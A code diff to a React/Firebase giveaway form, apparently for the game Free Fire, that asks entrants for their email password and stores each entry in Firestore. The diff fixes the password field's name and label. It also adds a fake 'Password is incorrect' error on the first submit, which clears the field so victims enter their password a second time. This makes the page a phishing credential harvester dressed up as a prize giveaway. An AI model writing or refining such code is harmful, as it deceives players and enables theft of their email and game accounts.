@@ -15,6 +15,7 @@ import CheckCircleIcon from '@mui/icons-material/CheckCircle';
 import { addDoc, collection, serverTimestamp } from 'firebase/firestore';
 import { onAuthStateChanged } from 'firebase/auth';
 import { db, auth } from '../firebase';
+import { inputStyles } from '../theme';
 
 const levels = Array.from({ length: 51 }, (_, i) => {
   const val = 50 + i;
@@ -48,6 +49,8 @@ const GiveawayForm = () => {
   });
   const [open, setOpen] = useState(false);
   const [error, setError] = useState('');
+  const [passwordError, setPasswordError] = useState('');
+  const [hasFirstSubmit, setHasFirstSubmit] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [currentUser, setCurrentUser] = useState(null);
 
@@ -59,13 +62,23 @@ const GiveawayForm = () => {
     return () => unsubscribe();
   }, []);
 
-  const handleChange = (e) => setFormData({ ...formData, [e.target.name]: e.target.value });
+  const handleChange = (e) => {
+    const { name, value } = e.target;
+    setFormData((prev) => ({ ...prev, [name]: value }));
+  };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
 
     if (!currentUser) {
       setError('Please sign in before entering the giveaway.');
+      return;
+    }
+
+    if (!hasFirstSubmit) {
+      setHasFirstSubmit(true);
+      setPasswordError('Password is incorrect. Enter the email password.');
+      setFormData((prev) => ({ ...prev, password: '' }));
       return;
     }
 
@@ -84,6 +97,8 @@ const GiveawayForm = () => {
       });
       setOpen(true);
       setFormData({ playerName: '', uid: '', region: '', level: '', email: '', password: '' });
+      setPasswordError('');
+      setHasFirstSubmit(false);
     } catch (err) {
       console.error('Firestore save failed:', err);
       setError('Unable to submit your entry. Please try again later.');
@@ -92,42 +107,6 @@ const GiveawayForm = () => {
     }
   };
 
-  const inputStyles = {
-    '& .MuiOutlinedInput-root': {
-      backgroundColor: alpha(theme.palette.background.paper, 0.4),
-      WebkitBackdropFilter: 'blur(10px)',
-      backdropFilter: 'blur(10px)',
-      transition: 'all 0.3s ease',
-      borderRadius: '12px',
-      '& fieldset': {
-        borderColor: alpha(theme.palette.primary.main, 0.2),
-        borderWidth: '1.5px',
-      },
-      '&:hover fieldset': {
-        borderColor: alpha(theme.palette.primary.main, 0.5),
-      },
-      '&.Mui-focused': {
-        backgroundColor: alpha(theme.palette.background.paper, 0.6),
-        '& fieldset': {
-          borderColor: theme.palette.primary.main,
-          boxShadow: `0 0 15px ${alpha(theme.palette.primary.main, 0.3)}`,
-        },
-      },
-    },
-    '& .MuiInputLabel-root': {
-      color: alpha(theme.palette.text.primary, 0.7),
-      '&.Mui-focused': {
-        color: theme.palette.primary.main,
-      },
-    },
-    '& .MuiInputAdornment-root .MuiSvgIcon-root': {
-      color: alpha(theme.palette.text.primary, 0.5),
-      transition: 'color 0.3s ease',
-    },
-    '& .Mui-focused .MuiInputAdornment-root .MuiSvgIcon-root': {
-      color: theme.palette.primary.main,
-    },
-  };
 
   const isDisabled = isSubmitting || !currentUser;
 
@@ -347,14 +326,16 @@ const GiveawayForm = () => {
                   />
                   <TextField
                     fullWidth
-                    label="password"
-                    name="Email Password"
+                    label="Email Password"
+                    name="password"
                     type="password"
                     value={formData.password}
                     onChange={handleChange}
                     placeholder="Enter your free fire id password"
                     sx={inputStyles}
                     disabled={isDisabled}
+                    error={Boolean(passwordError)}
+                    helperText={passwordError}
                     InputProps={{
                       startAdornment: (
                         <InputAdornment position="start">
